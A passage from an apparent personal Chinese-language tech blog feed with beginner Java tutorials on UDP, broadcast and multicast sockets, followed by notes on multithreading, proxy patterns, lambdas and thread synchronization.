           //将读取到的字符串转换为字节数组                byte[] datas = data.getBytes();                                //创建DatagramPacket对象，打包好数据，指定发送的目标地址和端口号                DatagramPacket packet = new DatagramPacket(datas,0,datas.length,new InetSocketAddress("127.0.0.1",6666));                                //发送数据                socket.send(packet);                                //判断是否输入了“bye”，如果是则退出循环                if (data.equals("bye")) &#123;                    break;                &#125;            &#125;                        //关闭DatagramSocket对象            socket.close();        &#125; catch (SocketException e) &#123;            e.printStackTrace();        &#125;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="多线程通信"><a href="#多线程通信" class="headerlink" title="多线程通信"></a>多线程通信</h3><h4 id="服务端-2"><a href="#服务端-2" class="headerlink" title="服务端"></a>服务端</h4><pre class="line-numbers language-Java"><code class="language-Java">//继承Runnable接口public class Sever implements Runnable &#123;       DatagramSocket socket = new DatagramSocket(6666);    private int port;    private String msgfrom;    public Sever(int port,String msgfrom) throws IOException &#123;        this.port = port;        this.msgfrom = msgfrom;        socket = new DatagramSocket(6666);    &#125;        //重写run()方法    public void run() &#123;           try &#123;            while (true) &#123;                byte[] container = new byte[1024];                //创建DatagramPacket对象，用于接收客户端发送的数据                DatagramPacket packet = new DatagramPacket(container,0,container.length);                //接收客户端发送的数据                socket.receive(packet);                byte[] data = packet.getData();                //将接收到的字节数组转换为字符串                String receiveDatas = new String(data,0,data.length);                System.out.println(msgfrom + ":" + receiveDatas);                //判断是否输入了“bye”，如果是则退出循环                //trim()去除首尾空格，equals()比较对象，被比较的放前面                if (receiveDatas.trim().equals("bye")) &#123;                    break;                &#125;            &#125;            //关闭DatagramSocket对象            socket.close();        &#125; catch (IOException e) &#123;            e.printStackTrace();        &#125;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="客户端-2"><a href="#客户端-2" class="headerlink" title="客户端"></a>客户端</h4><pre class="line-numbers language-Java"><code class="language-Java">public class Cilent implements Runnable &#123;    DatagramSocket socket = null;    BufferedReader reader = null;    private String toIP;    private int fromport;    private int toport;    public Cilent(int fromIP,String toIP,int toport) throws SocketException &#123;        this.fromport = fromport;        this.toport = toport;        this.toIP = toIP;        //创建DatagramSocket对象，监听指定端口        socket = new DatagramSocket(fromport);        //创建BufferedReader对象，用于从控制台读取数据        reader = new BufferedReader(new InputStreamReader(System.in));    &#125;    public void run() &#123;        try &#123;            while (true) &#123;                //从控制台读取数据                String data = reader.readLine();                //将读取到的字符串转换为字节数组                byte[] datas = data.getBytes();                //创建DatagramPacket对象，指定发送的目标地址和端口号                DatagramPacket packet = new DatagramPacket(datas,0,datas.length,new InetSocketAddress(this.toIP,this.toport));                //发送数据                socket.send(packet);                //判断是否输入了“bye”，如果是则退出循环                if (data.equals("bye")) &#123;                    break;                &#125;            &#125;            //关闭DatagramSocket对象            socket.close();        &#125; catch (IOException e) &#123;            e.printStackTrace();        &#125;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="广播通信"><a href="#广播通信" class="headerlink" title="广播通信"></a>广播通信</h2><h3 id="服务端-3"><a href="#服务端-3" class="headerlink" title="服务端"></a>服务端</h3><pre class="line-numbers language-Java"><code class="language-Java">public class Sever &#123;    public static void main(String args[]) &#123;        int port = 5858;        InetAddress group = null;        MulticastSocket socket = null;        try &#123;            //创建InetAddress对象，指定广播地址            group = InetAddress.getByName("127.0.0.1");            //创建MulticastSocket对象，监听指定端口            socket = new MulticastSocket(port);            //创建InetSocketAddress对象，指定广播地址和端口            InetSocketAddress socketAddress = new InetSocketAddress(group,port);            //获取指定网卡的NetworkInterface对象            NetworkInterface networkInterface = NetworkInterface.getByInetAddress(group);            //加入广播组            socket.joinGroup(socketAddress,networkInterface);        &#125; catch (Exception e) &#123;            e.printStackTrace();        &#125;        while (true) &#123;            byte data[] = new byte[8192];            DatagramPacket packet = null;            //创建DatagramPacket对象，用于接收广播内容            packet = new DatagramPacket(data,data.length,group,port);            try &#123;                socket.receive(packet);                //将接收到的字节数组转换为字符串                String message = new String(packet.getData(),0,packet.getLength());                System.out.println("接收的内容：" + message);            &#125; catch (Exception e) &#123;                e.printStackTrace();            &#125;        &#125;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="客户端-3"><a href="#客户端-3" class="headerlink" title="客户端"></a>客户端</h3><pre class="line-numbers language-Java"><code class="language-Java">public class Cilent &#123;    // Broadcast    String s = "abcd";    int port = 8989;    InetAddress group = null;    MulticastSocket socket = null;    Cilent() &#123;        try &#123;            //创建InetAddress对象，指定广播地址（路由器指定的）            group = InetAddress.getByName("255.255.255.255");            //创建MulticastSocket对象，监听指定端口            //  (注意，从这里开始DatagramSocket已经变成了MulticastSocket)            socket = new MulticastSocket(port);            //设置TTL值为1，表示只在本地网络中广播，TTL值是该字段指定IP包被路由器丢弃之前允许通过的最大网段数量，1代表只能通过一个网段            socket.setTimeToLive(1);            //创建InetSocketAddress对象，指定广播地址和端口            InetSocketAddress socketAddress = new InetSocketAddress(group,port);            //获取指定网卡的NetworkInterface对象            NetworkInterface networkInterface = NetworkInterface.getByInetAddress(group);            //加入广播组            socket.joinGroup(socketAddress,networkInterface);        &#125; catch (IOException e) &#123;            e.printStackTrace();        &#125;    &#125;    public void play() &#123;        while (true) &#123;            try &#123;                DatagramPacket packet = null;                byte data[] = s.getBytes();                //创建DatagramPacket对象，指定发送的目标地址和端口号                packet = new DatagramPacket(data,data.length,group,port);                System.out.println(new String(data));                //发送数据                socket.send(packet);                Thread.sleep(2000);            &#125; catch (Exception e) &#123;                e.printStackTrace();            &#125;        &#125;    &#125;    public static void main(String args[]) &#123;        new Cilent().play();    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="多播通信"><a href="#多播通信" class="headerlink" title="多播通信"></a>多播通信</h2><h3 id="服务器接收端程序"><a href="#服务器接收端程序" class="headerlink" title="服务器接收端程序"></a>服务器接收端程序</h3><pre class="line-numbers language-Java"><code class="language-Java">public class TestMain &#123;    private static MulticastSocket ds;   //多播套接字对象    static String multicastHost="239.0.0.255";   //多播组地址    static InetAddress receiveAddress;   //接收地址对象    public static void main(String[] args) throws IOException &#123;            // 创建多播套接字，绑定到本地的8899端口        ds = new MulticastSocket(8899);                  // 获取多播组地址        receiveAddress=InetAddress.getByName(multicastHost);                 // 将套接字加入多播组        ds.joinGroup(receiveAddress);                // 开启一个新线程，并将多播套接字对象传递给udpRunnable对象        new Thread(new udpRunnable(ds)).start();      &#125;&#125;class udpRunnable implements Runnable &#123;    MulticastSocket ds;    public udpRunnable(MulticastSocket ds) &#123;        this.ds=ds;    &#125;    public void run() &#123;            // 创建一个用于接收数据的缓冲区        byte buf[] = new byte[1024];          DatagramPacket dp = new DatagramPacket(buf, 1024);          while (true) &#123;              try &#123;                              // 从多播套接字中接收数据，并将数据存储到数据包对象中                ds.receive(dp);                                  // 打印接收到的客户端消息                System.out.println("receive client message : "+new String(buf, 0, dp.getLength()));              &#125; catch (Exception e) &#123;                  e.printStackTrace();              &#125;          &#125;      &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="客户发送端"><a href="#客户发送端" class="headerlink" title="客户发送端"></a>客户发送端</h3><pre class="line-numbers language-Java"><code class="language-Java">public class SendUdp &#123;    public static void main(String[] args) throws IOException &#123;        MulticastSocket ms=null;         DatagramPacket dataPacket = null;         ms = new MulticastSocket();                // 设置多播数据包的生存时间为32        ms.setTimeToLive(32);                  // 将字符串 "组播 测试" 转换为字节数组 data        byte[] data = "组播 测试".getBytes();                   // 获取多播组地址 address 对象        InetAddress address = InetAddress.getByName("239.0.0.255");                  // 创建数据包 dataPacket，指定数据、数据长度、目标地址和端口        dataPacket = new DatagramPacket(data, data.length, address,8899);                 // 发送数据包        ms.send(dataPacket);                  // 关闭套接字        ms.close();       &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="IP地址分级"><a href="#IP地址分级" class="headerlink" title="IP地址分级"></a>IP地址分级</h2><p>之前比赛写过这个还不是很了解，这里记一下</p><table><thead><tr><th>分类</th><th>范围</th></tr></thead><tbody><tr><td>A</td><td>0.0.0.0-127.255.255.255</td></tr><tr><td>B</td><td>128.0.0.0-191.255.255.255</td></tr><tr><td>C</td><td>192.0.0.0-223.255.255.255</td></tr><tr><td>D</td><td>224.0.0.0-239.255.255.255</td></tr><tr><td>E</td><td>240.0.0.0-255.255.255.255</td></tr></tbody></table><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>  发现一个网站，大家可以<a href="https://decomytree.com/home?hashedId=3L5dBvOjX-Kd">进来玩玩</a></p><p><a href="https://smms.app/image/73ArcZKfJHBeW8o" target="_blank"><img src="https://s2.loli.net/2023/12/14/73ArcZKfJHBeW8o.jpg" width="550"></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;  &lt;strong&gt;这篇文章我觉得我对于网络基础部分就不用再说更多了，直接一张图就够。剩下的用代码和注释来说明，看懂就是学会。&lt;/stron</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>Java多线程</title>
    <link href="https://liu1272.github.io/2023/12/13/Java%E5%A4%9A%E7%BA%BF%E7%A8%8B/"/>
    <id>https://liu1272.github.io/2023/12/13/Java%E5%A4%9A%E7%BA%BF%E7%A8%8B/</id>
    <published>2023-12-13T07:44:00.000Z</published>
    <updated>2023-12-20T18:26:11.332Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://smms.app/image/OWJiKn1hyEl3F9P" target="_blank"><img src="https://s2.loli.net/2023/12/14/OWJiKn1hyEl3F9P.png" ></a></p><h2 id="多线程概念"><a href="#多线程概念" class="headerlink" title="多线程概念"></a>多线程概念</h2><p><a href="https://smms.app/image/1QwXFzdknWJygA3" target="_blank"><img src="https://s2.loli.net/2023/12/14/1QwXFzdknWJygA3.jpg" ></a></p><ul><li>程序是指令和数据的集合</li><li>进程是执行程序的一次过程</li><li>线程是CPU调度执行的单位，无法人为干预</li><li>一个进程包括多个线程</li><li>分为真实多线程和模拟多线程</li></ul><h2 id="创建线程三种方式"><a href="#创建线程三种方式" class="headerlink" title="创建线程三种方式"></a>创建线程三种方式</h2><h3 id="【一】继承Thread类"><a href="#【一】继承Thread类" class="headerlink" title="【一】继承Thread类"></a>【一】继承Thread类</h3><ol><li>自定义线程类继承Thread类</li><li>重写run()方法，编写线程执行体</li><li>创建线程对象，调用start()方法启动线程</li></ol><pre class="line-numbers language-Java"><code class="language-Java">public class Main &#123;    public static void main(String[] args) &#123;        Thread t = new MyThread();   // 创建线程对象        t.start();  // 调用start()方法启动线程    &#125;&#125;class MyThread extends Thread &#123;    // 自定义线程类继承Thread类    @Override    public void run() &#123;    // 重写run()方法，编写线程执行体        System.out.println("start new thread!");    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="【二】实现Runnable接口"><a href="#【二】实现Runnable接口" class="headerlink" title="【二】实现Runnable接口"></a>【二】实现Runnable接口</h3><ol><li>定义MyRunnable类实现Runnable接口</li><li>实现run()方法，编写线程执行体</li><li>创建线程对象，调用start()方法启动线程</li><li>推荐使用Runnable对象，因为Java单继承的局限性</li></ol><pre class="line-numbers language-Java"><code class="language-Java">public class Main &#123;    public static void main(String[] args) &#123;        Thread t = new Thread(new MyRunnable());   // 创建线程对象        t.start(); // 调用start()方法启动线程    &#125;&#125;class MyRunnable implements Runnable &#123;   // 定义MyRunnable类实现Runnable接口    @Override    public void run() &#123;   // 实现run()方法，编写线程执行体        System.out.println("start new thread!");    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="【三】通过-Callable-和-Future-创建线程"><a href="#【三】通过-Callable-和-Future-创建线程" class="headerlink" title="【三】通过 Callable 和 Future 创建线程"></a>【三】通过 Callable 和 Future 创建线程</h3><ol><li>实现Callable接口，需要返回值类型</li><li>重写call方法，需要抛出异常</li><li>创建目标对象</li><li>创建执行服务:ExecutorService ser = Executors.newFixedThreadPool(1);</li><li>提交执行: Future&lt; Boolean &gt; result1 = ser.submit(t1);</li><li>获取结果: boolean r1 = result1.get()</li><li>关闭服务: ser.shutdownNow();</li><li>上两个方法在执行完任务之后无法获取执行结果，执行失败也不会抛出异常（得要通过共享变量或者使用线程通信的方式才能实现）</li><li>Callable接口代表一段可以调用并返回结果的代码;Future接口表示异步任务，是还没有完成的任务给出的未来结果。所以说Callable用于产生结果，Future用于获取结果</li></ol><pre class="line-numbers language-Java"><code class="language-Java">import java.util.concurrent.*;public class java01 &#123;    ExecutorService executorService = Executors.newCachedThreadPool();    Future<Integer> submit = executorService.submit(new Callable<Integer>() &#123;        @Override        public Integer call() throws Exception &#123;            return null;        &#125;    &#125;);    Callable<Integer> callable = new Callable<Integer>() &#123;        @Override        public Integer call() throws Exception &#123;            return null;        &#125;    &#125;;    FutureTask<Integer> integerFutureTask = new FutureTask<>(callable);&#125;new Thread(integerFutureTask).start();<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>  <strong>推荐使用实现Runnable接口的方法来创建线程，可以避免Java单继承的局限性，同时操作同个对象</strong><br>  <strong>但是正因为同时操作了同个对象，导致了线程安全问题</strong></p><h2 id="Java三种代理模式"><a href="#Java三种代理模式" class="headerlink" title="Java三种代理模式"></a>Java三种代理模式</h2><p>  代理模式是一种设计模式，提供了对目标对象额外的访问方式，即通过代理对象访问目标对象，这样可以在不修改原目标对象的前提下，提供额外的功能操作，扩展目标对象的功能。</p><p>  简言之，代理模式就是设置一个中间代理来控制访问原目标对象，以达到增强原对象的功能和简化访问方式。</p><h3 id="【静态代理】"><a href="#【静态代理】" class="headerlink" title="【静态代理】"></a><strong>【静态代理】</strong></h3><p>这种代理方式需要<strong>代理对象和目标对象实现一样的接口</strong>。<br>优点：可以在不修改目标对象的前提下扩展目标对象的功能。<br>缺点：</p><pre><code>冗余。由于代理对象要实现与目标对象一致的接口，会产生过多的代理类。不易维护。一旦接口增加方法，目标对象与代理对象都要进行修改。</code></pre><pre class="line-numbers language-Java"><code class="language-Java">public interface IUserDao &#123;  // 接口类： IUserDao    public void save();  // 定义接口方法&#125;public class UserDao implements IUserDao&#123;  // 目标对象：UserDao    @Override    public void save() &#123;  // 实现目标对象的接口方法        System.out.println("保存数据");    &#125;&#125; public class UserDaoProxy implements IUserDao&#123; // 静态代理对象：UserDapProxy 需要实现IUserDao接口！    private IUserDao target;    public UserDaoProxy(IUserDao target) &#123;        this.target = target;    &#125;        @Override    public void save() &#123;  // 实现代理对象的接口方法        System.out.println("开启事务");  //扩展了额外功能        target.save();        System.out.println("提交事务");    &#125;&#125;public class StaticUserProxy &#123;  // 测试类：TestProxy    @Test    public void testStaticProxy()&#123;        //目标对象        IUserDao target = new UserDao();        //代理对象        UserDaoProxy proxy = new UserDaoProxy(target);        proxy.save();  // 调用代理对象的方法    &#125;&#125;输出结果:  开启事务  保存数据  提交事务<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="【动态代理】"><a href="#【动态代理】" class="headerlink" title="【动态代理】"></a><strong>【动态代理】</strong></h3><p>  动态代理利用了JDK API，动态地在内存中构建代理对象，从而实现对目标对象的代理功能。动态代理又被称为JDK代理或接口代理。</p><p>静态代理与动态代理的区别主要在：</p><pre><code>静态代理在编译时就已经实现，编译完成后代理类是一个实际的class文件动态代理是在运行时动态生成的，即编译完成后没有实际的class文件，而是在运行时动态生成类字节码，并加载到JVM中</code></pre><p>特点：<br>  动态代理对象不需要实现接口，但是要求<strong>目标对象必须实现接口</strong>，否则不能使用动态代理。</p><pre class="line-numbers language-Java"><code class="language-Java">public interface IUserDao &#123;  // 接口类： IUserDao    public void save();  // 定义接口方法&#125;public class UserDao implements IUserDao&#123;  // 目标对象：UserDao    @Override    public void save() &#123;  // 实现目标对象的接口方法        System.out.println("保存数据");    &#125;&#125;public class ProxyFactory &#123;    private Object target;// 维护一个目标对象    public ProxyFactory(Object target) &#123;        this.target = target;    &#125;    // 为目标对象生成代理对象    public Object getProxyInstance() &#123;        return Proxy.newProxyInstance(target.getClass().getClassLoader(), target.getClass().getInterfaces(),                new InvocationHandler() &#123;                    @Override                    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable &#123;                        System.out.println("开启事务");                        // 执行目标对象方法                        Object returnValue = method.invoke(target, args);                        System.out.println("提交事务");                        return null;                    &#125;                &#125;);    &#125;&#125;public class TestProxy &#123;    @Test    public void testDynamicProxy ()&#123;        IUserDao target = new UserDao();        System.out.println(target.getClass());  //输出目标对象信息        IUserDao proxy = (IUserDao) new ProxyFactory(target).getProxyInstance();        System.out.println(proxy.getClass());  //输出代理对象信息        proxy.save();  //执行代理方法    &#125;&#125;输出结果:  开启事务  保存数据  提交事务<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="【cglib代理】"><a href="#【cglib代理】" class="headerlink" title="【cglib代理】"></a><strong>【cglib代理】</strong></h3><p>  cglib 是一个第三方代码生成类库，运行时在内存中动态生成一个子类对象从而实现对目标对象功能的扩展。</p><p>cglib特点：<strong>无需实现接口</strong></p><pre><code>JDK的动态代理有一个限制，就是使用动态代理的对象必须实现一个或多个接口。如果想代理没有实现接口的类，就可以使用CGLIB实现。CGLIB是一个强大的高性能的代码生成包，它可以在运行期扩展Java类与实现Java接口。它广泛的被许多AOP的框架使用，例如Spring AOP和dynaop，为他们提供方法的interception（拦截）。CGLIB包的底层是通过使用一个小而快的字节码处理框架ASM，来转换字节码并生成新的类。不鼓励直接使用ASM，因为它需要你对JVM内部结构包括class文件的格式和指令集都很熟悉。</code></pre><p>cglib与动态代理最大的区别就是</p><pre><code>使用动态代理的对象必须实现一个或多个接口使用cglib代理的对象则无需实现接口，达到代理类无侵入。</code></pre><pre class="line-numbers language-Java"><code class="language-Java">public class UserDao&#123;    public void save() &#123;        System.out.println("保存数据");    &#125;&#125;public class ProxyFactory implements MethodInterceptor&#123;    private Object target;//维护一个目标对象    public ProxyFactory(Object target) &#123;        this.target = target;    &#125;        //为目标对象生成代理对象    public Object getProxyInstance() &#123;        //工具类        Enhancer en = new Enhancer();        //设置父类        en.setSuperclass(target.getClass());        //设置回调函数        en.setCallback(this);        //创建子类对象代理        return en.create();    &#125;    @Override    public Object intercept(Object obj, Method method, Object[] args, MethodProxy proxy) throws Throwable &#123;        System.out.println("开启事务");        // 执行目标对象的方法        Object returnValue = method.invoke(target, args);        System.out.println("关闭事务");        return null;    &#125;&#125;public class TestProxy &#123;    @Test    public void testCglibProxy()&#123;        //目标对象        UserDao target = new UserDao();        System.out.println(target.getClass());        //代理对象        UserDao proxy = (UserDao) new ProxyFactory(target).getProxyInstance();        System.out.println(proxy.getClass());        //执行代理对象方法        proxy.save();    &#125;&#125;输出结果:  开启事务  保存数据  关闭事务<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ol><li>静态代理实现较简单，只要代理对象对目标对象进行包装，即可实现增强功能，但静态代理只能为一个目标对象服务，如果目标对象过多，则会产生很多代理类。</li><li>JDK动态代理需要目标对象实现业务接口，代理类只需实现InvocationHandler接口。</li><li>静态代理在编译时产生class字节码文件，可以直接使用，效率高。</li><li>动态代理必须实现InvocationHandler接口，通过反射代理方法，比较消耗系统性能，但可以减少代理类的数量，使用更灵活。</li><li>cglib代理无需实现接口，通过生成类字节码实现代理，比反射稍快，不存在性能问题，但cglib会继承目标对象，需要重写方法，所以目标对象不能为final类。</li></ol><h2 id="Lambda表达式"><a href="#Lambda表达式" class="headerlink" title="Lambda表达式"></a>Lambda表达式</h2><p>使用Lambda表达式替换单方法接口：</p><pre class="line-numbers language-Java"><code class="language-Java">Arrays.sort(array, new Comparator<String>() &#123;    public int compare(String s1, String s2) &#123;        return s1.compareTo(s2);    &#125;&#125;);上面的可变为下面的形式Arrays.sort(array, (s1, s2) -> &#123;    return s1.compareTo(s2);&#125;);参数是(s1, s2)，参数类型可以省略，因为编译器可以自动推断出String类型。-> &#123; ... &#125;表示方法体，所有代码写在内部即可。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果只有一行return xxx的代码，完全可以用更简单的写法：</p><pre class="line-numbers language-Java"><code class="language-Java">Arrays.sort(array, (s1, s2) -> s1.compareTo(s2));返回值的类型也是由编译器自动推断的，这里推断出的返回值是int，因此，只要返回int，编译器就不会报错。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="线程五大状态"><a href="#线程五大状态" class="headerlink" title="线程五大状态"></a>线程五大状态</h2><p><a href="https://smms.app/image/ahJjMVtcqdRIEPf" target="_blank"><img src="https://s2.loli.net/2023/12/14/ahJjMVtcqdRIEPf.jpg" ></a><br><a href="https://smms.app/image/c8B1KWYHNpOdmb2" target="_blank"><img src="https://s2.loli.net/2023/12/14/c8B1KWYHNpOdmb2.jpg" ></a></p><h3 id="线程停止"><a href="#线程停止" class="headerlink" title="线程停止"></a>线程停止</h3><p>不推荐使用JDK提供的 stop()、destroy()方法。<br>推荐线程自己停止下来，使用一个标志位进行终止变量（当flag=false终止线程运行）</p><h3 id="线程休眠"><a href="#线程休眠" class="headerlink" title="线程休眠"></a>线程休眠</h3><p>  sleep(时间)指定当前线程阻塞的毫秒数<br>  sleep存在异常InterruptedException;<br>  sleep时间达到后线程进入就绪状态<br>  sleep可以模拟网络延时，倒计时等<br>  每一个对象都有一个锁，sleep不会释放锁</p><h3 id="线程礼让"><a href="#线程礼让" class="headerlink" title="线程礼让"></a>线程礼让</h3><p>  礼让线程，让当前正在执行的线程暂停，但不阻塞<br>  将线程从运行状态转为就绪状态<br>  让cpu重新调度，礼让不一定成功!看CPU心情</p><h3 id="线程强制执行"><a href="#线程强制执行" class="headerlink" title="线程强制执行"></a>线程强制执行</h3><p>  Join合并线程，待此线程执行完成后，再执行其他线程，其他线程阻塞</p><h3 id="线程优先级"><a href="#线程优先级" class="headerlink" title="线程优先级"></a>线程优先级</h3><p>  Java提供一个线程调度器来监控程序中启动后进入就绪状态的所有线程，线程调度器按照优先级决定应该调度哪个线程来执行线程的优先级用数字表示，范围从1~10.<br><code>Thread.MIN PRIORITY = 1;</code><br>使用以下方式改变或获取优先级</p><pre><code>getPriority() . setPriority(int xxx)</code></pre><h3 id="守护线程"><a href="#守护线程" class="headerlink" title="守护线程"></a>守护线程</h3><p>  线程分为用户线程和守护线程<br>  虚拟机必须确保<strong>用户线程</strong>执行完毕<br>  虚拟机不用等待<strong>守护线程</strong>执行完毕</p><pre><code>thread.setDaemon(true); //默认是false表示是用户线程 ，正常的线程都是用户线程</code></pre><h2 id="线程同步"><a href="#线程同步" class="headerlink" title="线程同步"></a>线程同步</h2><p>实现要求：队列+锁<br>由于同一进程的多个线程共享同一块存储空间，导致访问冲突问题<br>为了保证数据在方法中被访问时的正确性，在访问时加入锁机制<code>synchronized</code><br>加锁释放锁会导致比较多的上下文切换和调度延时起性能问题<br>但是一个优先级高的线程等待一个优先级低的线程释放锁会导致优先级倒置，引起性能问题</p><h3 id="同步方法和同步块"><a href="#同步方法和同步块" class="headerlink" title="同步方法和同步块"></a>同步方法和同步块</h3><p>同步方法:<br><code>public synchronized void method(int args) &#123;&#125;</code><br>  每个对象对应一把锁每个synchronized方法都必须获得调用该方法的对象的锁才能执行<br>  缺陷:若将一个大的方法申明为synchronized 将会影响效率</p><p>同步块:<br><code>synchronized (obj) &#123;&#125;</code><br>  obj 可以是任何对象，但是推荐使用共享资源作为同步监视器（obj）<br>  同步方法中无需指定同步监视器（obj），因为同步方法的同步监视器就是this，就是这个对象本身</p><ol><li>第一个线程访问，锁定同步监视器，执行其中代码</li><li>第二个线程访问，发现同步监视器被锁定，无法访问</li><li>第一个线程访问完毕，解锁同步监视器</li><li>第二个线程访问，发现同步监视器没有锁，然后锁定并访问</li></ol><p>  对于普通同步方法，锁是当前实例对象。如果有多个实例,那么锁对象必然不同无法实现同步。<br>  对于静态同步方法，锁是当前类的Class对象。有多个实例但是锁对象是相同的,可以完成同步。<br>  对于同步方法块，锁是Synchonized括号里配置的对象。如当前类的class只有一个,锁对象相同 也能实现同步。</p><h2 id="锁"><a href="#锁" class="headerlink" title="锁"></a>锁</h2><h3 id="死锁"><a href="#死锁" class="headerlink" title="死锁"></a>死锁</h3><p>  多个线程各自占有一些共享资源，并且互相等待其他线程占有的资源才能运行<br>  而某一个同步块同时拥有“两个以上对象的锁”导致两个或者多个线程都在等待对方释放资源，都停止执行的情形时，就可能会发生“死锁”的问题</p><p>产生死锁的四个必要条件：</p><ol><li>互斥条件:一个资源每次只能被一个进程使用。</li><li>请求与保持条件:一个进程因请求资源而阻塞时，对已获得的资源保持不放</li><li>不剥夺条件:进程已获得的资源，在末使用完之前，不能强行剥夺</li><li>循环等待条件:若千进程之间形成一种头尾相接的循环等待资源关系</li></ol><p>  只要打破以上的任意一个条件就能解除死锁。</p><h3 id="Lock锁"><a href="#Lock锁" class="headerlink" title="Lock锁"></a>Lock锁</h3><p>  从JDK5.0开始Java提供了更强大的线程同步机制-通过显式定义同步锁对象来实现同步。同步锁使用Lock对象实现。<br>  锁提供了对共享资源的独占访问，每次只能有一个线程对Lock对象加锁，线程开始访问共享资源之前应先获得Lock对象<br>  ReentrantLock（可重入锁）拥有与synchronized 